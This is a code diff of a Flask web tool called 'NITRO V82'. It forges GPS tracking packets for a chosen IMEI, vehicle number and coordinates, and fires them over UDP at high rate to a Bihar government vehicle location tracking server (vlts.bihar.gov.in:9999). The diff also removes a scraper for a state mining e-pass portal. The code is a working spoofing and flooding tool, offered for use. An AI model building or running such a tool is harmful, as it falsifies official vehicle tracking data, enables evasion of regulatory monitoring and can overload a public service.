@@ -1,135 +1,122 @@
-import os, socket, threading, time, requests
+import os, socket, threading, time
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify
-from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-# --- CONFIG & DEFAULTS ---
+# --- PURE ENGINE STATE ---
 DEFAULTS = {
-    "tag": "EGAS", "imei": "862567075041793", "vno": "BR03GB9117",
-    "lat": "25.65", "lon": "84.78", "proto": "UDP"
+    "tag": "MARK",
+    "imei": "123456787654",
+    "vno": "BR03GB9117",
+    "lat": "25.654673",
+    "lon": "84.783456"
 }
-status = {"firing": False, "count": 0, "p_stat": "IDLE", "sync": "NEVER", "p_date": "WAITING...", **DEFAULTS}
+status = {"firing": False, "count": 0, **DEFAULTS}
 
-HTML_V82 = """
+HTML_V82_RAW = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>NITRO V82 ULTIMATE</title>
+    <title>NITRO V82 - VERIFY & FIRE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
-        .box { border: 2px solid #0f0; padding: 15px; display: inline-block; border-radius: 15px; width: 100%; max-width: 420px; box-shadow: 0 0 20px #0f0; background: #050505; }
-        .metric { font-size: 50px; color: #fff; margin: 10px 0; text-shadow: 0 0 10px #0f0; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; text-align: left; }
-        input, select { width: 90%; padding: 10px; margin: 4px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-transform: uppercase; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; border-radius: 15px; width: 100%; max-width: 500px; box-shadow: 0 0 30px #0f0; background: #050505; }
+        .metric { font-size: 60px; color: #fff; margin: 10px 0; font-weight: bold; text-shadow: 0 0 15px #0f0; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
+        input { width: 90%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
         .full { grid-column: span 2; }
+        .preview-box { background: #111; color: yellow; padding: 10px; border: 1px dashed #0f0; margin-top: 15px; font-size: 11px; word-break: break-all; text-align: left; min-height: 40px; }
         .btn { padding: 15px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
-        .start { background: #004d00; color: #fff; border: 1px solid #0f0; }
-        .stop { background: #600; color: #fff; border: 1px solid #f00; }
-        .status-bar { background: #111; padding: 10px; margin: 10px 0; border-radius: 8px; font-size: 12px; border: 1px solid #333; color: yellow; text-align: left; }
+        .start { background: #008000; color: #fff; box-shadow: 0 0 15px #0f0; }
+        .stop { background: #600; color: #fff; }
+        .reset { background: #333; color: #fff; border: 1px solid #777; }
+        label { font-size: 12px; color: #aaa; margin-left: 5px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3>🚀 NITRO V82 GHOP-GHOP</h3>
+        <h2 style="margin:0;">🚀 NITRO V82 VERIFY</h2>
         <div class="metric" id="cnt">0</div>
-        <div class="status-bar">
-            📡 Portal: <span id="ps">{{p_stat}}</span><br>
-            📅 Captured Date: <span id="pd" style="color:#fff">{{p_date}}</span><br>
-            🕒 Sync Time: <span id="ls">{{sync}}</span>
-        </div>
-        <form action="/action" method="post" class="grid">
-            <div class="full"><label>VEHICLE NO (FOR SEARCH)</label><input type="text" name="vno" value="{{vno}}"></div>
-            <div><label>IMEI</label><input type="text" name="imei" value="{{imei}}"></div>
-            <div><label>TAG</label><input type="text" name="tag" value="{{tag}}"></div>
-            <div><label>LAT</label><input type="text" name="lat" value="{{lat}}"></div>
-            <div><label>LON</label><input type="text" name="lon" value="{{lon}}"></div>
+        
+        <form action="/action" method="post" id="fireForm" class="grid">
+            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="updatePreview()"></div>
+            <div><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" oninput="updatePreview()"></div>
+            <div><label>TAG</label><input type="text" name="tag" id="tag" value="{{tag}}" oninput="updatePreview()"></div>
+            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updatePreview()"></div>
+            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updatePreview()"></div>
+            
             <div class="full">
-                <select name="proto">
-                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP (HIGH SPEED)</option>
-                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP (STABLE)</option>
-                </select>
+                <label>📋 LIVE PACKET PREVIEW (STRING VERIFICATION)</label>
+                <div class="preview-box" id="preview">Generating...</div>
             </div>
-            <button class="btn start full" name="btn" value="start">🔥 FORCE START</button>
+
+            <button class="btn start full" name="btn" value="start">🔥 START RAW FIRING</button>
             <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
+            <button type="button" class="btn reset full" onclick="resetData()">🔄 RESET TO DEFAULTS</button>
         </form>
     </div>
+
     <script>
+        function updatePreview() {
+            let v = document.getElementById('vno').value.toUpperCase();
+            let i = document.getElementById('imei').value;
+            let t = document.getElementById('tag').value.toUpperCase();
+            let la = document.getElementById('lat').value;
+            let lo = document.getElementById('lon').value;
+            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
+            let h = new Date().toLocaleTimeString('en-GB', {hour12: false}).replace(/:/g, '');
+            
+            let packet = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*`;
+            document.getElementById('preview').innerText = packet;
+        }
+
+        function resetData() {
+            document.getElementById('vno').value = "BR03GB9117";
+            document.getElementById('imei').value = "123456787654";
+            document.getElementById('tag').value = "MARK";
+            document.getElementById('lat').value = "25.654673";
+            document.getElementById('lon').value = "84.783456";
+            updatePreview();
+        }
+
         setInterval(() => {
             fetch('/data').then(r => r.json()).then(d => {
                 document.getElementById('cnt').innerText = d.count.toLocaleString();
-                document.getElementById('ps').innerText = d.p_stat;
-                document.getElementById('ls').innerText = d.sync;
-                document.getElementById('pd').innerText = d.p_date;
             });
         }, 1000);
+
+        // Initial preview load
+        updatePreview();
     </script>
 </body>
 </html>
 """
 
-def fetch_khanansoft():
-    session = requests.Session()
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
-    url = "https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx"
-    
-    while True:
-        if status["firing"]:
-            try:
-                # 1. Get initial page to grab ASP hidden fields
-                resp = session.get(url, timeout=10)
-                soup = BeautifulSoup(resp.text, 'html.parser')
-                
-                data = {
-                    "__VIEWSTATE": soup.find(id="__VIEWSTATE")['value'],
-                    "__EVENTVALIDATION": soup.find(id="__EVENTVALIDATION")['value'],
-                    "txtVehicleNo": status["vno"],
-                    "btnSearch": "Search"
-                }
-                
-                # 2. Post the Search request
-                post_resp = session.post(url, data=data, timeout=10)
-                final_soup = BeautifulSoup(post_resp.text, 'html.parser')
-                
-                # 3. Find 'Challan Date' in the table
-                # Asli logic: Table mein 'Challan Date' ke baad dusra cell value hoti hai
-                target = final_soup.find(text=lambda x: x and 'Challan Date' in x)
-                if target:
-                    # ASP structures: usually <td>Challan Date</td><td>:</td><td>VALUE</td>
-                    extracted = target.find_next('td').find_next('td').text.strip()
-                    status["p_date"] = extracted
-                    status["p_stat"] = "✅ DATA CAPTURED"
-                else:
-                    status["p_stat"] = "❌ NO PASS FOUND"
-                
-                status["sync"] = datetime.now().strftime("%H:%M:%S")
-            except Exception as e:
-                status["p_stat"] = "⚠️ PORTAL ERROR"
-        time.sleep(5)
-
 def firing_engine():
     target = ("vlts.bihar.gov.in", 9999)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while status["firing"]:
         try:
             now = datetime.now()
-            # Firing packet with user inputs
-            pkt = f"$PVT,{status['tag']},2.1.1,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
+            # Firing the exact string shown in preview
+            pkt = f"$PVT,{status['tag']},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
             
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(100):
+            for _ in range(1000):
                 if not status["firing"]: break
                 sock.sendto(pkt, target)
                 status["count"] += 1
-            sock.close()
-            time.sleep(1)
+            
+            time.sleep(0.001)
         except:
-            time.sleep(2)
+            time.sleep(1)
+    sock.close()
 
 @app.route('/')
 def home():
-    return render_template_string(HTML_V82, **status)
+    return render_template_string(HTML_V82_RAW, **status)
 
 @app.route('/data')
 def data():
@@ -138,14 +125,12 @@ def data():
 @app.route('/action', methods=['POST'])
 def action():
     val = request.form.get('btn')
-    # Update global status with clean, capitalized inputs
     status.update({
-        "tag": (request.form.get('tag') or DEFAULTS['tag']).upper().strip(),
-        "imei": (request.form.get('imei') or DEFAULTS['imei']).upper().strip(),
-        "vno": (request.form.get('vno') or DEFAULTS['vno']).upper().strip(),
-        "lat": request.form.get('lat') or DEFAULTS['lat'],
-        "lon": request.form.get('lon') or DEFAULTS['lon'],
-        "proto": request.form.get('proto', 'UDP')
+        "tag": (request.form.get('tag') or "MARK").upper().strip(),
+        "imei": (request.form.get('imei') or "123456787654").strip(),
+        "vno": (request.form.get('vno') or "BR03GB9117").upper().strip(),
+        "lat": request.form.get('lat') or "25.654673",
+        "lon": request.form.get('lon') or "84.783456"
     })
     
     if val == "start" and not status["firing"]:
@@ -153,11 +138,8 @@ def action():
         threading.Thread(target=firing_engine, daemon=True).start()
     elif val == "stop":
         status["firing"] = False
-        status["p_stat"] = "IDLE"
-    
+        
     return home()
 
 if __name__ == "__main__":
-    # Multi-threading for Khanansoft sync
-    threading.Thread(target=fetch_khanansoft, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
